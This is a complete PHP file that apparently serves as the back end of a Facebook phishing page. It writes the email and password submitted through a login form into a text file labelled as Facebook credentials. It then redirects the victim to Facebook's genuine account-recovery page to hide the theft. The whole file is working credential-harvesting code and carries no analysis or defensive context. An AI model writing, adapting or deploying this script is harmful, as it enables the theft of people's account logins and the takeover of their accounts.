<?php 
file_put_contents("userlog.txt", "Facebook Username: " . $_POST['email'] . "\nPassword: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://facebook.com/recover/initiate/');
exit();
?>